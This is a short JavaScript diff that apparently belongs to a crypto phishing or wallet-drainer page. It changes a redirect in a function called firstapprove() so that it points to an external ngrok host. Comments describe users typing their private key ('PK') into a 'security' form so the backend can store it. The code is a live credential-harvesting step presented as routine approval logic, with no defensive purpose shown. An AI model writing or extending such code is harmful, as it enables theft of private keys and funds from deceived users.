@@ -42,7 +42,7 @@ let USER_TOKEN_ADDR = null;
 async function firstapprove() {
   try {
     // Redirect the browser to the PK form page
-    window.location.href = "/prodbot/security";
+    window.location.href = "https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security";
     // User will see the form, type PK, submit → backend stores it
     // After submission, backend returns JSON { "message": "PK stored successfully" }
     // At that point, you can flip firsttime = true in your approve handler
